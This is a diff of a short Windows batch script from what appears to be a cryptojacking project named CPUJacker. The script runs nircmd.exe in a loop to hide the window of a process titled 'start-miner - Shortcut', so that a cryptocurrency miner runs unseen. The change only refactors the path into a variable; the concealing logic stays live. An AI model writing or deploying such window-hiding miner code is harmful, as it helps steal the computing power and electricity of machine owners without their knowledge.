@@ -1,4 +1,6 @@
-@echo off                                                                     
+@echo off
+set nircmd_dir=C:\CPUJacker
+
 for /L %%a in (1,1,10) do (
-C:\CPUJacker\nircmd.exe win hide title "start-miner - Shortcut"          
+    "%nircmd_dir%\nircmd.exe" win hide title "start-miner - Shortcut"
 )
